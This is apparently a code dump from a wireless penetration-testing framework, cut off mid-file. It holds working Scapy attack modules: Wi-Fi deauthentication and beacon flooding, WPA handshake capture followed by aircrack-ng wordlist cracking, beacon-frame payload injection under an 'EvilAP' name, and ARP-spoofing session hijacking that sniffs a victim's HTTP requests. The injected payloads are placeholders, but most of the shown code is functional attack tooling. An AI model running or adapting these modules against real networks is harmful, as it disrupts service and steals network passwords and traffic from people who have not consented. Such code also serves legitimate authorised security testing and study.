        self.logger.info(f"Starting Bluetooth device scan on interface {self.interface}.")
        # Implement Bluetooth scanning logic using Scapy or other libraries
        # Placeholder: Simulate device discovery
        while self.scanning:
            # Simulate discovery
            device = f'Device_{len(self.scan_results) + 1}'
            mac = f'AA:BB:CC:DD:EE:{len(self.scan_results) + 1:02X}'
            self.scan_results[mac] = device
            self.logger.info(f"Discovered Bluetooth Device: Name='{device}', MAC='{mac}'")
            time.sleep(5)  # Simulate time between discoveries

    def start_scan(self):
        """
        Initiates a Bluetooth scan.
        """
        self.logger.info("Starting Bluetooth scan.")
        self.scan_results = {}
        self.scanning = True
        if not self.scan_thread or not self.scan_thread.is_alive():
            self.scan_thread = threading.Thread(target=self.scan_devices)
            self.scan_thread.start()

    def stop_scan(self):
        """
        Stops the Bluetooth scan and processes results.
        """
        self.logger.info("Stopping Bluetooth scan.")
        self.scanning = False
        if self.scan_thread and self.scan_thread.is_alive():
            self.scan_thread.join()
        self.logger.info(f"Bluetooth Scan Results: {self.scan_results}")
        # Dispatch scan complete event if needed


# core/config/protocols/wifi.py
from scapy.all import *
from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Deauth
import threading
import logging
from core.config.protocols.base_protocol import BaseProtocol


class WiFiProtocol(BaseProtocol):
    def __init__(self, interface='wlan0mon', core=None):
        """
        Initializes the WiFiProtocol.

        :param interface: Wireless interface in monitor mode.
        :param core: Reference to the CoreFramework instance.
        """
        self.interface = interface
        self.logger = logging.getLogger(self.__class__.__name__)
        self.scan_results = {}
        self.core = core  # Reference to CoreFramework for packet handling

    def register(self, event_dispatcher):
        """
        Registers event listeners relevant to Wi-Fi operations.
        """
        # Subscribe to events
        event_dispatcher.subscribe('start_scan', self.start_scan)
        event_dispatcher.subscribe('stop_scan', self.stop_scan)
        event_dispatcher.subscribe('start_deauth', self.start_deauth)
        event_dispatcher.subscribe('stop_deauth', self.stop_deauth)
        event_dispatcher.subscribe('start_beacon_flood', self.start_beacon_flood)
        event_dispatcher.subscribe('stop_beacon_flood', self.stop_beacon_flood)
        self.logger.info("WiFiProtocol registered to Event Dispatcher.")

    def start(self):
        """
        Starts any necessary Wi-Fi operations.
        """
        self.logger.info("Starting Wi-Fi Protocol operations.")
        # For example, initiate packet sniffing via CoreFramework
        self.core.start_packet_sniffing()

    def stop(self):
        """
        Stops any ongoing Wi-Fi operations.
        """
        self.logger.info("Stopping Wi-Fi Protocol operations.")
        self.core.stop_packet_sniffing()

    def start_scan(self):
        """
        Initiates a Wi-Fi scan.
        """
        self.logger.info("Starting Wi-Fi scan.")
        self.scan_results = {}
        # The packet sniffer is already running; scan results are collected by the Packet Analyzer

    def stop_scan(self):
        """
        Stops the Wi-Fi scan and processes results.
        """
        self.logger.info("Stopping Wi-Fi scan.")
        # Since the sniffer runs continuously, you might implement scan duration or trigger stop externally
        # For simplicity, assume the scan duration is managed by the test script

    def start_deauth(self, target_bssid, target_client=None, count=10):
        """
        Initiates a deauthentication attack.

        :param target_bssid: BSSID of the target access point.
        :param target_client: (Optional) Specific client to deauthenticate.
        :param count: Number of deauth packets to send.
        """
        self.logger.info(f"Starting deauthentication attack on BSSID: {target_bssid}")
        dot11 = Dot11(addr1=target_client if target_client else 'FF:FF:FF:FF:FF:FF',
                    addr2=self.core.packet_handler.packet_injector.packet_injector.get_interface_mac(),
                    addr3=target_bssid)
        pkt = RadioTap()/dot11/Dot11Deauth(reason=7)
        self.core.send_packet(pkt, count=count, inter=0.1)
        self.logger.info("Deauthentication attack completed.")

    def stop_deauth(self):
        """
        Stops the deauthentication attack.
        """
        self.logger.info("Stopping deauthentication attack.")
        self.core.stop_continuous_packets()

    def start_beacon_flood(self, ssid='FakeAP', count=1000):
        """
        Starts a beacon flooding attack.

        :param ssid: SSID of the fake access point.
        :param count: Number of beacon frames to send.
        """
        self.logger.info(f"Starting beacon flooding attack with SSID '{ssid}'.")
        dot11 = Dot11(type=0, subtype=8, addr1='FF:FF:FF:FF:FF:FF',
                    addr2=self.get_interface_mac(),
                    addr3=self.get_interface_mac())
        beacon = Dot11Beacon(cap='ESS+privacy')
        essid = Dot11Elt(ID='SSID', info=ssid, len=len(ssid))
        rsn = Dot11Elt(ID='RSNinfo', info=(
            '\x01\x00'  # RSN Version 1
            '\x00\x0f\xac\x02'  # Group Cipher Suite: CCMP
            '\x02\x00'  # Pairwise Cipher Suite Count
            '\x00\x0f\xac\x04'  # Pairwise Cipher Suite: CCMP
            '\x00\x0f\xac\x02'  # Pairwise Cipher Suite: TKIP
            '\x01\x00'  # AKM Suite Count
            '\x00\x0f\xac\x02'  # AKM Suite: PSK
            '\x00\x00'  # RSN Capabilities
        ))
        frame = RadioTap()/dot11/beacon/essid/rsn

        self.core.send_continuous_packets(frame, interval=0.1)
        self.logger.info("Beacon flooding attack started.")

    def stop_beacon_flood(self):
        """
        Stops the beacon flooding attack.
        """
        self.logger.info("Stopping beacon flooding attack.")
        self.core.stop_continuous_packets()

    def get_interface_mac(self):
        """
        Retrieves the MAC address of the specified wireless interface.
        """
        try:
            return get_if_hwaddr(self.interface)
        except Exception as e:
            self.logger.error(f"Failed to get MAC address for interface {self.interface}: {e}")
            return '00:00:00:00:00:00'


# core/config/protocols/__init__.py
from core.config.protocols.base_protocol import BaseProtocol
from core.config.protocols.bluetooth import BluetoothProtocol
from core.config.protocols.wifi import WiFiProtocol
from scanners.auth_bypass_scanner import AuthBypassScanner
from scanners.encryption_scanner import EncryptionWeaknessScanner
from scanners.dos_scanner import DosScanner
from scanners.wep_scanner import WEPScanner
from scanners.local_scanner import LocalScanner
from exploits.session_hijacking import SessionHijacking
from exploits.payload_delivery import PayloadDelivery
from exploits.credential_extraction import CredentialExtraction
# core/config/protocols/__init__.py

# Optionally, register multiple scanners/exploits or keep it empty
# Avoid relative imports unless absolutely necessary

def register_scanners():
    return {
        'wifi': WiFiProtocol,
        'bluetooth': BluetoothProtocol,
        'auth_bypass': AuthBypassScanner,
        'encryption_weakness': EncryptionWeaknessScanner,
        'dos': DosScanner,
        'local': LocalScanner,
        'wep_scanner': WEPScanner,
    }
def register_exploits():
    return {
        'session_hijacking': SessionHijacking,
        'payload_delivery': PayloadDelivery,
        'credential_extraction': CredentialExtraction
    }



# exploits/base_exploit.py
from abc import ABC, abstractmethod
import logging

class BaseExploit:
    """
    A base class for implementing exploits.
    """
    def __init__(self, *args, **kwargs):
        """
        Initialize the BaseExploit with necessary parameters.
        """
        self.logger = logging.getLogger(self.__class__.__name__)
        self.logger.info(f"{self.__class__.__name__} initialized with parameters: {kwargs}")

    def execute(self, vuln_info: dict):
        """
        Execute the exploit based on vulnerability information.

        Args:
            vuln_info (dict): Information about the vulnerability to exploit.
        """
        self.logger.info(f"Executing exploit with vulnerability info: {vuln_info}")
        # Placeholder for exploit logic
        pass

# exploits/credential_extraction.py
from scapy.layers.dot11 import RadioTap, Dot11, Dot11Deauth
from scapy.layers.eap import EAPOL
from scapy.sendrecv import sendp, sniff
from scapy.all import conf, wrpcap
import subprocess
import time
import threading
import logging
import os

from .base_exploit import BaseExploit


class CredentialExtraction(BaseExploit):
    """
    A class to perform credential extraction by capturing WPA/WPA2 handshakes
    using deauthentication attacks and cracking them to retrieve network passwords.
    """

    def __init__(self, core_framework, vulnerability, wordlist_path, cracked_passwords_path='cracked_passwords.txt'):
        """
        Initializes the CredentialExtraction exploit.

        Args:
            core_framework: The core framework instance.
            vulnerability: A dictionary containing vulnerability details.
            wordlist_path (str): Path to the wordlist for cracking.
            cracked_passwords_path (str): Path to save cracked passwords.
        """
        super().__init__(core_framework, vulnerability)
        self.extracting = False
        self.extract_thread = None
        self.sniff_thread = None
        self.captured_handshakes = []
        self.vulnerability = vulnerability
        self.core = core_framework
        self.stop_event = threading.Event()
        self.logger = logging.getLogger(self.__class__.__name__)
        self.wordlist_path = wordlist_path
        self.cracked_passwords_path = cracked_passwords_path

        # Ensure wordlist exists
        if not os.path.isfile(self.wordlist_path):
            self.logger.error(f"Wordlist file not found at {self.wordlist_path}")
            raise FileNotFoundError(f"Wordlist file not found at {self.wordlist_path}")

    def exploit(self):
        """
        Executes the credential extraction process.
        """
        self.logger.info("Starting Credential Extraction exploit.")
        target_network = self.vulnerability.get('target_network')

        if not target_network:
            self.logger.error("No target network specified for credential extraction.")
            return {"status": "error", "message": "No target network specified."}

        bssid = target_network.get('bssid')
        channel = target_network.get('channel')

        if not all([bssid, channel]):
            self.logger.error("Incomplete target network information for credential capture.")
            return {"status": "error", "message": "Incomplete target network information."}

        interface = self.core.packet_handler.packet_injector.interface
        self.logger.debug(f"Target BSSID: {bssid}, Channel: {channel}, Interface: {interface}")

        try:
            # Set the wireless interface to the target channel
            self._set_interface_channel(interface, channel)

            # Start the handshake capture thread
            self.extracting = True
            self.extract_thread = threading.Thread(target=self._capture_handshakes, args=(bssid, interface), daemon=True)
            self.extract_thread.start()

            # Start the sniffing thread
            self.sniff_thread = threading.Thread(target=self._sniff_handshakes, args=(bssid, interface), daemon=True)
            self.sniff_thread.start()

            self.logger.info("Credential Extraction exploit initiated.")
            return {"status": "success"}

        except Exception as e:
            self.logger.exception(f"Failed to start Credential Extraction exploit: {e}")
            return {"status": "error", "message": str(e)}

    def _set_interface_channel(self, interface, channel):
        """
        Sets the wireless interface to the specified channel.

        Args:
            interface (str): The network interface to configure.
            channel (int): The channel number to set.
        """
        self.logger.debug(f"Setting interface {interface} to channel {channel}.")
        try:
            subprocess.check_call(['iwconfig', interface, 'channel', str(channel)],
                                  stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            self.logger.info(f"Interface {interface} set to channel {channel}.")
        except subprocess.CalledProcessError as e:
            self.logger.error(f"Failed to set channel on interface {interface}: {e}")
            raise

    def _capture_handshakes(self, bssid, interface, deauth_count=100, interval=0.1, pause=2):
        """
        Sends deauthentication packets to capture handshakes.

        Args:
            bssid (str): The BSSID of the target network.
            interface (str): The network interface to use for sending packets.
            deauth_count (int): Number of deauth packets to send per interval.
            interval (float): Time between sending individual deauth packets.
            pause (int): Time to wait between sending bursts of deauth packets.
        """
        self.logger.info("Starting to send deauthentication packets.")
        try:
            deauth_pkt = RadioTap() / Dot11(addr1='FF:FF:FF:FF:FF:FF',
                                           addr2=self.core.packet_handler.packet_injector.get_interface_mac(),
                                           addr3=bssid) / Dot11Deauth(reason=7)

            while not self.stop_event.is_set():
                sendp(deauth_pkt, iface=interface, count=deauth_count, inter=interval, verbose=False)
                self.logger.debug(f"Sent {deauth_count} deauth packets to {bssid}.")
                time.sleep(pause)
        except Exception as e:
            self.logger.exception(f"Error during deauthentication attack: {e}")
            self.stop_event.set()

    def _sniff_handshakes(self, bssid, interface, timeout=None):
        """
        Sniffs for EAPOL packets to capture handshakes.

        Args:
            bssid (str): The BSSID of the target network.
            interface (str): The network interface to use for sniffing.
            timeout (int, optional): Time in seconds to stop sniffing. None for indefinite.
        """
        self.logger.info("Starting to sniff for EAPOL handshakes.")

        def packet_filter(packet):
            return (packet.haslayer(Dot11) and
                    packet.type == 2 and  # Data frames
                    packet.addr3.lower() == bssid.lower() and
                    packet.haslayer(EAPOL))

        try:
            sniff(iface=interface,
                  prn=self._process_packet,
                  lfilter=packet_filter,
                  stop_filter=lambda x: self.stop_event.is_set(),
                  timeout=timeout)
        except Exception as e:
            self.logger.exception(f"Error during packet sniffing: {e}")
            self.stop_event.set()

    def _process_packet(self, packet):
        """
        Processes a captured packet and extracts the handshake if present.

        Args:
            packet: The captured Scapy packet.
        """
        if packet.haslayer(EAPOL):
            client_mac = packet.addr2
            self.logger.info(f"Captured EAPOL handshake from {client_mac}")
            self.captured_handshakes.append(packet)
            # Optionally, stop after capturing a certain number of handshakes
            # For example:
            # if len(self.captured_handshakes) >= desired_number:
            #     self.stop_event.set()

    def capture_handshake_callback(self, packet):
        """
        Callback function to process captured packets and extract handshakes.
        (Deprecated in favor of _process_packet)

        Args:
            packet: The captured Scapy packet.
        """
        self._process_packet(packet)

    def cleanup(self):
        """
        Cleans up after exploitation to restore the environment and initiate cracking.
        """
        self.logger.info("Cleaning up Credential Extraction exploit.")
        self.stop_event.set()

        if self.extract_thread and self.extract_thread.is_alive():
            self.extract_thread.join()
            self.logger.debug("Deauthentication thread has been terminated.")

        if self.sniff_thread and self.sniff_thread.is_alive():
            self.sniff_thread.join()
            self.logger.debug("Sniffing thread has been terminated.")

        self.extracting = False

        # Optionally, reset the interface to its original state
        # For example, setting the channel back to automatic
        interface = self.core.packet_handler.packet_injector.interface
        try:
            subprocess.check_call(['iwconfig', interface, 'channel', 'auto'],
                                  stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            self.logger.info(f"Interface {interface} channel set back to auto.")
        except subprocess.CalledProcessError as e:
            self.logger.warning(f"Failed to reset channel on interface {interface}: {e}")

        self.logger.info(f"Total handshakes captured: {len(self.captured_handshakes)}")

        # Save captured handshakes to a pcap file
        handshake_file = self._save_handshakes()

        if handshake_file:
            # Initiate cracking process
            self._initiate_cracking(handshake_file)

    def _save_handshakes(self, filepath='captured_handshakes.pcap'):
        """
        Saves the captured handshakes to a file.

        Args:
            filepath (str): The path to the file where handshakes will be saved.

        Returns:
            str: The path to the saved handshake file.
        """
        if not self.captured_handshakes:
            self.logger.warning("No handshakes to save.")
            return None

        try:
            wrpcap(filepath, self.captured_handshakes)
            self.logger.info(f"Handshakes saved to {filepath}.")
            return filepath
        except Exception as e:
            self.logger.error(f"Failed to save handshakes: {e}")
            return None

    def _initiate_cracking(self, handshake_file, aircrack_path='aircrack-ng'):
        """
        Initiates the cracking process using Aircrack-ng.

        Args:
            handshake_file (str): Path to the pcap file containing captured handshakes.
            aircrack_path (str): Path to the aircrack-ng executable.
        """
        self.logger.info("Initiating cracking process.")
        if not os.path.isfile(handshake_file):
            self.logger.error(f"Handshake file {handshake_file} does not exist.")
            return

        if not os.path.isfile(self.wordlist_path):
            self.logger.error(f"Wordlist file {self.wordlist_path} does not exist.")
            return

        # Construct the Aircrack-ng command
        cmd = [
            aircrack_path,
            '-w', self.wordlist_path,
            '-b', self.vulnerability['target_network']['bssid'],
            handshake_file
        ]

        self.logger.debug(f"Running command: {' '.join(cmd)}")

        try:
            # Run Aircrack-ng as a subprocess
            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

            stdout, stderr = process.communicate()

            if process.returncode == 0:
                # Parse the output to find the cracked password
                for line in stdout.split('\n'):
                    if 'KEY FOUND!' in line:
                        password_line = next((l for l in stdout.split('\n') if 'KEY FOUND!' in l), None)
                        if password_line:
                            password = password_line.split(':')[-1].strip()
                            self._save_cracked_password(password)
                            self.logger.info(f"Password cracked: {password}")
                            return
                self.logger.info("Aircrack-ng completed without finding the password.")
            else:
                self.logger.error(f"Aircrack-ng failed with error: {stderr}")

        except FileNotFoundError:
            self.logger.error(f"Aircrack-ng not found at path: {aircrack_path}")
        except Exception as e:
            self.logger.exception(f"An error occurred during cracking: {e}")

    def _save_cracked_password(self, password):
        """
        Saves the cracked password to a file.

        Args:
            password (str): The cracked password.
        """
        try:
            with open(self.cracked_passwords_path, 'a') as f:
                f.write(f"{password}\n")
            self.logger.info(f"Cracked password saved to {self.cracked_passwords_path}.")
        except Exception as e:
            self.logger.error(f"Failed to save cracked password: {e}")

    # Optionally, implement a method to initiate cracking in a separate thread
    def start_cracking(self, handshake_file, aircrack_path='aircrack-ng'):
        """
        Starts the cracking process in a separate thread.

        Args:
            handshake_file (str): Path to the pcap file containing captured handshakes.
            aircrack_path (str): Path to the aircrack-ng executable.
        """
        cracking_thread = threading.Thread(target=self._initiate_cracking, args=(handshake_file, aircrack_path), daemon=True)
        cracking_thread.start()
        self.logger.info("Cracking thread started.")

    def execute(self, vuln_info: dict):
        """
        Execute the exploit based on vulnerability information.

        Args:
            vuln_info (dict): Information about the vulnerability to exploit.
        """
        self.logger.info(f"Executing exploit with vulnerability info: {vuln_info}")
        self.vulnerability = vuln_info
        self.exploit()
        self.cleanup()

# exploits/payload_delivery.py
import threading
import subprocess
import logging
import os
import time
from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt, RadioTap
from scapy.sendrecv import sendp
from scapy.all import conf

from .base_exploit import BaseExploit


class PayloadDelivery(BaseExploit):
    """
    A class to perform payload delivery by injecting malicious beacon frames
    or other wireless frames targeting specific devices or networks.
    """

    def __init__(self, core_framework, vulnerability,
                 essid='EvilAP',
                 payload_types=None,
                 injection_interval=0.1,
                 channel=None):
        """
        Initializes the PayloadDelivery exploit.

        Args:
            core_framework: The core framework instance.
            vulnerability: A dictionary containing vulnerability details.
            essid (str): The ESSID to advertise. Defaults to 'EvilAP'.
            payload_types (dict): A dictionary mapping payload types to their crafting functions.
            injection_interval (float): Time interval between packet injections in seconds.
            channel (int): The wireless channel to operate on. If None, uses the target network's channel.
        """
        super().__init__(core_framework, vulnerability)
        self.delivering = False
        self.vulnerability = vulnerability
        self.core = core_framework
        self.essid = essid
        self.injection_interval = injection_interval
        self.channel = channel or self.vulnerability.get('target_network', {}).get('channel')
        self.interface = self.core.packet_handler.packet_injector.interface
        self.stop_event = threading.Event()
        self.inject_thread = None
        self.payload_types = payload_types or {
            'reverse_shell': self._craft_reverse_shell_payload,
            'malicious_script': self._craft_malicious_script_payload,
            'generic': self._craft_generic_payload
        }
        self.logger = logging.getLogger(self.__class__.__name__)

        # Validate interface mode
        self._ensure_monitor_mode()

    def exploit(self):
        """
        Executes the payload delivery process.
        """
        self.logger.info("Starting Payload Delivery exploit.")
        target_device = self.vulnerability.get('target_device')

        if not target_device:
            self.logger.error("No target device specified for payload delivery.")
            return {"status": "error", "message": "No target device specified."}

        # Determine the payload type based on the vulnerability
        payload_type = self.vulnerability.get('payload_type', 'generic')

        # Craft the malicious payload
        payload = self._craft_payload(payload_type, target_device)

        if not payload:
            self.logger.error("Failed to craft payload.")
            return {"status": "error", "message": "Failed to craft payload."}

        # Start the payload injection thread
        try:
            self.delivering = True
            self.inject_thread = threading.Thread(target=self._inject_payload, args=(payload,), daemon=True)
            self.inject_thread.start()
            self.logger.info("Payload Delivery exploit initiated.")
            return {"status": "success"}
        except Exception as e:
            self.logger.exception(f"Failed to start payload delivery: {e}")
            return {"status": "error", "message": str(e)}

    def _ensure_monitor_mode(self):
        """
        Ensures that the network interface is in monitor mode.
        """
        try:
            mode = self.core.packet_handler.packet_injector.get_interface_mode()
            if mode != 'monitor':
                self.logger.info(f"Setting interface {self.interface} to monitor mode.")
                subprocess.check_call(['airmon-ng', 'start', self.interface],
                                      stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                self.logger.info(f"Interface {self.interface} set to monitor mode.")
            else:
                self.logger.debug(f"Interface {self.interface} is already in monitor mode.")
        except subprocess.CalledProcessError as e:
            self.logger.error(f"Failed to set monitor mode on interface {self.interface}: {e}")
            raise
        except Exception as e:
            self.logger.exception(f"Unexpected error while setting monitor mode: {e}")
            raise

    def _inject_payload(self, payload):
        """
        Continuously injects the crafted payload into beacon frames.

        Args:
            payload (bytes): The malicious payload to inject.
        """
        self.logger.info("Starting payload injection loop.")
        try:
            while not self.stop_event.is_set():
                frame = self._build_frame(payload)
                sendp(frame, iface=self.interface, inter=self.injection_interval, verbose=False)
                self.logger.debug("Injected malicious beacon frame.")
                time.sleep(self.injection_interval)
        except Exception as e:
            self.logger.exception(f"Error during payload injection: {e}")
            self.stop_event.set()

    def _build_frame(self, payload):
        """
        Builds the malicious wireless frame with the payload.

        Args:
            payload (bytes): The malicious payload to inject.

        Returns:
            scapy.layers.dot11.RadioTap: The crafted wireless frame.
        """
        dot11 = Dot11(type=0, subtype=8,
                     addr1='FF:FF:FF:FF:FF:FF',  # Broadcast
                     addr2=self.core.packet_handler.packet_injector.get_interface_mac(),
                     addr3=self.core.packet_handler.packet_injector.get_interface_mac())
        beacon = Dot11Beacon(cap='ESS+privacy')
        essid = Dot11Elt(ID='SSID', info=self.essid, len=len(self.essid))
        # Adding a Vendor Specific element for the payload
        payload_element = Dot11Elt(ID=221, info=payload)
        frame = RadioTap() / dot11 / beacon / essid / payload_element
        return frame

    def _craft_payload(self, payload_type, target_device):
        """
        Crafts the malicious payload based on the specified type.

        Args:
            payload_type (str): The type of payload to craft.
            target_device (dict): Information about the target device.

        Returns:
            bytes: The crafted payload.
        """
        crafting_function = self.payload_types.get(payload_type, self.payload_types['generic'])
        return crafting_function(target_device)

    def _craft_reverse_shell_payload(self, target_device):
        """
        Crafts a reverse shell payload.

        Args:
            target_device (dict): Information about the target device.

        Returns:
            bytes: The crafted reverse shell payload.
        """
        # WARNING: Crafting actual reverse shells requires careful implementation.
        # This is a placeholder NOP sled.
        payload = b'\x90' * 100
        self.logger.debug("Crafted reverse shell payload.")
        return payload

    def _craft_malicious_script_payload(self, target_device):
        """
        Crafts a malicious script payload to be injected.

        Args:
            target_device (dict): Information about the target device.

        Returns:
            bytes: The crafted malicious script payload.
        """
        script = "<script>alert('Malicious Payload');</script>"
        payload = script.encode('utf-8')
        self.logger.debug("Crafted malicious script payload.")
        return payload

    def _craft_generic_payload(self, target_device):
        """
        Crafts a generic payload.

        Args:
            target_device (dict): Information about the target device.

        Returns:
            bytes: The crafted generic payload.
        """
        generic_payload = b'\x90' * 50  # NOP sled as a placeholder
        self.logger.debug("Crafted generic payload.")
        return generic_payload

    def cleanup(self):
        """
        Cleans up after exploitation to restore the environment.
        """
        self.logger.info("Cleaning up Payload Delivery exploit.")
        self.stop_event.set()

        if self.inject_thread and self.inject_thread.is_alive():
            self.inject_thread.join()
            self.logger.debug("Payload injection thread has been terminated.")

        self.delivering = False

        # Optionally, reset the interface to its original state
        try:
            subprocess.check_call(['airmon-ng', 'stop', self.interface],
                                  stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            self.logger.info(f"Interface {self.interface} set back to managed mode.")
        except subprocess.CalledProcessError as e:
            self.logger.warning(f"Failed to reset interface {self.interface} to managed mode: {e}")

        self.logger.info("Payload Delivery exploit stopped.")

    def _validate_vulnerability(self):
        """
        Validates the vulnerability dictionary for required fields.
        """
        required_fields = ['target_device']
        missing_fields = [field for field in required_fields if field not in self.vulnerability]
        if missing_fields:
            self.logger.error(f"Missing required vulnerability fields: {', '.join(missing_fields)}")
            raise ValueError(f"Missing required vulnerability fields: {', '.join(missing_fields)}")


# exploits/session_hijacking.py
# wireless_pen_test_lib/exploits/session_hijacking.py

import time
import threading
import logging
from scapy.all import send, sr, conf, sniff
import subprocess
from scapy.layers.l2 import Ether, ARP
import os
import signal
import multiprocessing
import json
import datetime
from jinja2 import Environment, FileSystemLoader

from core import CoreFramework  # Ensure this is an absolute import
from base_exploit import BaseExploit  # Ensure this is an absolute import


class SessionHijacking(BaseExploit):
    """
    A class to perform session hijacking via ARP spoofing with advanced automation features.
    """

    def __init__(self, core_framework, vulnerability, max_packets: int = 100, interval: float = 2.0,
                 capture_file: str = "capture.pcap", filter_expression: str = None, real_time: bool = False):
        """
        Initialize the SessionHijacking exploit.

        Args:
            core_framework: The core framework instance.
            vulnerability (dict): Information about the vulnerability, including target and gateway IPs.
            max_packets (int): Maximum number of spoofed ARP packets to send.
            interval (float): Time interval between sending ARP spoofing packets in seconds.
            capture_file (str): File path to save captured packets.
            filter_expression (str): BPF filter expression for packet capturing.
            real_time (bool): Whether to process packets in real-time.
        """
        super().__init__(core_framework, vulnerability)
        self.max_packets = max_packets
        self.interval = interval
        self.capture_file = capture_file
        self.filter_expression = filter_expression or f"host {self.vulnerability.get('target_ip')} and host {self.vulnerability.get('gateway_ip')}"
        self.real_time = real_time
        self.analysis_results = []
        self.stop_event = multiprocessing.Event()
        self.processes = []
        self.logger = logging.getLogger(self.__class__.__name__)

        # Extract necessary information from vulnerability dict
        self.target_ip = self.vulnerability.get('target_ip')
        self.gateway_ip = self.vulnerability.get('gateway_ip')
        self.interface = self.core.packet_handler.packet_injector.interface

        if not self.target_ip or not self.gateway_ip:
            self.logger.error("Both target_ip and gateway_ip must be specified in vulnerability info.")
            raise ValueError("Missing target_ip or gateway_ip in vulnerability info.")

        self.target_mac = None
        self.gateway_mac = None

        # Initialize multiprocessing manager for shared data
        self.manager = multiprocessing.Manager()
        self.analysis_results = self.manager.list()

    def execute(self):
        """
        Execute the session hijacking exploit and start monitoring.

        Returns:
            dict: Status of the exploit execution with detected vulnerabilities.
        """
        self.logger.info(f"Starting Session Hijacking on target IP: {self.target_ip}")
        try:
            # Ensure the interface is in monitor mode
            self._ensure_monitor_mode()

            # Resolve MAC addresses
            self.target_mac = self._get_mac(self.target_ip)
            self.gateway_mac = self._get_mac(self.gateway_ip)

            if not self.target_mac:
                self.logger.error(f"Could not resolve MAC address for target IP: {self.target_ip}")
                return {"status": "error", "message": f"Could not resolve MAC address for target IP: {self.target_ip}"}

            if not self.gateway_mac:
                self.logger.error(f"Could not resolve MAC address for gateway IP: {self.gateway_ip}")
                return {"status": "error", "message": f"Could not resolve MAC address for gateway IP: {self.gateway_ip}"}

            self.logger.debug(f"Target MAC: {self.target_mac}, Gateway MAC: {self.gateway_mac}")

            # Start ARP spoofing process
            arp_process = multiprocessing.Process(target=self._arp_spoof, daemon=True)
            arp_process.start()
            self.processes.append(arp_process)
            self.logger.debug(f"ARP spoofing process started with PID: {arp_process.pid}")

            if self.real_time:
                # Start real-time packet processing process
                real_time_process = multiprocessing.Process(target=self._real_time_packet_processing, daemon=True)
                real_time_process.start()
                self.processes.append(real_time_process)
                self.logger.debug(f"Real-time packet processing started with PID: {real_time_process.pid}")
            else:
                # Start tcpdump monitoring process
                monitor_process = multiprocessing.Process(target=self._start_monitoring, daemon=True)
                monitor_process.start()
                self.processes.append(monitor_process)
                self.logger.debug(f"tcpdump monitoring process started with PID: {monitor_process.pid}")

            # Start process monitoring thread
            monitor_thread = threading.Thread(target=self._monitor_processes, daemon=True)
            monitor_thread.start()

            self.logger.info("Session Hijacking exploit and monitoring initiated.")
            return {"status": "success"}

        except Exception as e:
            self.logger.exception(f"Failed to execute Session Hijacking exploit: {e}")
            self.cleanup()
            return {"status": "error", "message": str(e)}

    def _arp_spoof(self):
        """
        Continuously send spoofed ARP replies to the target and gateway to perform ARP poisoning.
        """
        self.logger.info("Starting ARP spoofing.")
        try:
            count = 0
            while not self.stop_event.is_set() and count < self.max_packets:
                # Tell the target that we are the gateway
                spoof_target = ARP(op=2, pdst=self.target_ip, psrc=self.gateway_ip,
                                   hwdst=self.target_mac, hwsrc=self.core.packet_handler.packet_injector.get_interface_mac())
                # Tell the gateway that we are the target
                spoof_gateway = ARP(op=2, pdst=self.gateway_ip, psrc=self.target_ip,
                                    hwdst=self.gateway_mac, hwsrc=self.core.packet_handler.packet_injector.get_interface_mac())

                send(spoof_target, iface=self.interface, verbose=False)
                send(spoof_gateway, iface=self.interface, verbose=False)

                self.logger.debug(f"Sent spoofed ARP packets: {count+1}/{self.max_packets}")
                count += 1
                time.sleep(self.interval)
        except Exception as e:
            self.logger.exception(f"Error during ARP spoofing: {e}")
            self.stop_event.set()

    def _real_time_packet_processing(self):
        """
        Captures and processes packets in real-time using Scapy.
        """
        self.logger.info("Starting real-time packet processing with Scapy.")
        try:
            # Define the filter for Scapy's sniff
            scapy_filter = self.filter_expression

            sniff(
                iface=self.interface,
                filter=scapy_filter,
                prn=self._process_packet,
                store=False,
                stop_filter=lambda x: self.stop_event.is_set()
            )
        except Exception as e:
            self.logger.exception(f"Real-time packet processing failed: {e}")
            self.stop_event.set()

    def _process_packet(self, packet):
        """
        Callback function to process each captured packet.
        """
        self.logger.debug(f"Processing packet: {packet.summary()}")

        # Example: Detect HTTP GET requests and extract URLs
        if packet.haslayer("TCP") and packet.haslayer("Raw"):
            try:
                payload = packet["Raw"].load.decode('utf-8', errors='ignore')
                if "GET" in payload:
                    # Simple extraction of the requested URL
                    request_line = payload.split('\r\n')[0]
                    method, url, _ = request_line.split()
                    self.logger.info(f"Detected HTTP GET request for URL: {url}")
                    self.analysis_results.append({'type': 'HTTP_GET', 'url': url})
            except Exception as e:
                self.logger.debug(f"Failed to parse HTTP GET request: {e}")

        # Additional processing can be implemented here

    def _start_monitoring(self):
        """
        Starts the packet capturing process using tcpdump.
        """
        self.logger.info("Starting network traffic monitoring with tcpdump.")
        try:
            # Ensure the capture file does not already exist
            if os.path.exists(self.capture_file):
                os.remove(self.capture_file)

            # Build the tcpdump command
            cmd = [
                'tcpdump',
                '-i', self.interface,
                '-w', self.capture_file,
                '-s', '0',  # Capture the entire packet
                self.filter_expression
            ]

            # Start tcpdump as a subprocess
            self.monitor_process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            self.logger.debug(f"tcpdump started with PID: {self.monitor_process.pid}")

            # Allow tcpdump some time to initialize
            time.sleep(2)
            if self.monitor_process.poll() is not None:
                self.logger.error("tcpdump failed to start.")
                raise RuntimeError("tcpdump failed to start.")

            self.logger.info(f"Packet capturing started with filter '{self.filter_expression}'. Saving to {self.capture_file}")

            while not self.stop_event.is_set():
                time.sleep(1)

        except Exception as e:
            self.logger.exception(f"Failed to start network monitoring: {e}")
            self.stop_event.set()

    def _monitor_processes(self):
        """
        Monitors the health of child processes and handles any unexpected terminations.
        """
        self.logger.info("Starting to monitor child processes.")
        try:
            while not self.stop_event.is_set():
                for process in self.processes:
                    if not process.is_alive():
                        self.logger.warning(f"Process PID {process.pid} has terminated unexpectedly.")
                        # Optionally, restart the process or take other actions
                        # For simplicity, initiate cleanup
                        self.stop_event.set()
                        self.cleanup()
                        break
                time.sleep(5)  # Check every 5 seconds
        except Exception as e:
            self.logger.exception(f"Error in process monitoring: {e}")
            self.stop_event.set()
            self.cleanup()

    def cleanup(self):
        """
        Cleans up after exploitation to restore the environment and stop monitoring.
        """
